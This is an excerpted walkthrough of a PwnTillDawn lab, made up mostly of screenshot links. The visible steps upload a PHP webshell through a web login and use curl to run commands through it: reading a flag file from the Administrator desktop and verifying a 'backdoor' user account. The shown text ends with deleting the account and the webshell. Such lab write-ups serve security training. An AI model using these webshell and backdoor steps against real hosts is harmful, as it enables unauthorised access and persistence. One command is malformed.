...
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/nmapsn.png)
...
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/nmapsvpt4.png)
...
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/HTTP.png)
...
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/admin.png)

Upload Directory: Browsing to `/upload/` also shows directory listing.
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/upload.png)

Login Page: The web application contains a login page at `/login.php`.
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/loginphp.png)
...
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/curlerror1.png)
...
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/curladminadmin1.png)
...
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/doneuploadwebshell.png)

The file is successfully stored in the `/upload/2/` directory discovered earlier.
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/upload2directory.png)
...
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/curlwhoami.png)

![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/whoami.png)
...
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/targetfile.png)

![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/webtargetfile.png)

Then read the flag file.
```bash
curl "http://10.150.150.11/upload/2/webshell.php cmd=type%20C:\Users\Administrator\Desktop\FLAG1.txt"
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/curlflag.png)

![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/webflag.png)
...
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/backdoor.png)

Verify the account creation:
```bash
curl "http://10.150.150.11/upload/2/webshell.php?cmd=net%20user%20backdoor"
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/backdoorverify.png)
...
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/deletebackdoor.png)
...
```
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/deletewebshell.png)
...
![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/FLAGSUCCESS.png)
